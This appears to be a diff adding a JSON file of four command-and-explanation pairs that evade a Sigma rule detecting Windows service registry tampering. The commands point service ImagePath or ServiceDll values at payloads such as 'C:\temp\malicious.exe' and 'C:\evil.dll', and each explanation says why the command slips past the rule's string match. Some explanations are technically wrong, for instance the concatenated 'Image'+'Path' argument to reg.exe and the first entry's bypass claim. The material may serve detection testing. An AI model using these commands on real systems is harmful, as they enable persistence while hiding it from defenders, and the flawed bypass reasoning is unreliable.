@@ -1,0 +1,18 @@
+[
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LegitService\" /v \"ImagePath\" /t REG_EXPAND_SZ /d \"C:\\temp\\malicious.exe\" /f",
+    "explanation": "The Sigma rule is looking for the literal string '\\ImagePath' (with a backslash) in the command line. By using the standard registry path format 'Services\\LegitService' and then the value name 'ImagePath' without a preceding backslash as part of the string, the 'contains' logic for '\\ImagePath' is bypassed while still achieving the registry modification."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\MyService' -Name 'ServiceDll' -Value 'C:\\evil.dll'\"",
+    "explanation": "The rule is designed to catch command-line tools like reg.exe that explicitly list the target key and value in the arguments. Using PowerShell cmdlets often formats the command line differently; since 'ServiceDll' is passed as a named parameter rather than a path string containing '\\ServiceDll', it avoids the specific string match in the selection criteria."
+  },
+  {
+    "output": "reg.exe copy \"HKLM\\SYSTEM\\ControlSet001\\Services\\ServiceA\" \"HKLM\\SYSTEM\\ControlSet001\\Services\\ServiceB\" /s /f",
+    "explanation": "The rule looks for specific value names like ImagePath or ServiceDll. By using the 'copy' function of reg.exe, an attacker can overwrite a service configuration using another key as a template. The command line contains 'ControlSet' and 'services' but does not explicitly contain the prohibited value name strings, bypassing the filter."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WeakService\" /v \"Image\"+\"Path\" /d \"C:\\pwned.exe\"",
+    "explanation": "In some environments, command-line obfuscation or simple string manipulation (like concatenating strings in a script before execution) ensures the process creation event log does not literally contain the substring '\\ImagePath', which is required for the rule to trigger."
+  }
+]
